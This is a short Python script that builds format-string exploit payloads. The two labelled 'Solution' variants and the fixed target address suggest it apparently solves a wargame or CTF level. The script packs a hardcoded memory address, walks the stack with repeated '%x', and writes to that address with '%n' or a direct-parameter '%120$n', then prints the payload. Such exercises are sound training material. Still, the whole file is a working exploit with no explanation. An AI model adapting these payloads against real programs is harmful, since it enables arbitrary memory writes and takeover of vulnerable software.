#!/usr/bin/python2.6

import struct

def pad(s, length=500):
    assert(len(s) <= length)
    return (s+"A"*length)[:length]

target_addr = struct.pack("P", 0x08049638)

# Solution1
payload1 = pad(

    # Wrap target address so we can find it easily in the output
    # "AAAA" + "AAAA" + target_addr + "BBBB" + "BBBB" + "%x "*125,
    # "AAAA" + "AAAA" + target_addr + "BBBB" + "BBBB" + "%x "*119 + "%x ",
      "AAAA" + "AAAA" + target_addr + "BBBB" + "BBBB" + "%x "*119 + "%n ",
    1000
)

# Solution 2
payload2 = pad(
    # "AAAA" + "AAAA" + target_addr + "BBBB" + "BBBB" + " %120$x ",
      "AAAA" + "AAAA" + target_addr + "BBBB" + "BBBB" + " %120$n ",
    1000
)

payload = payload1
print(payload)
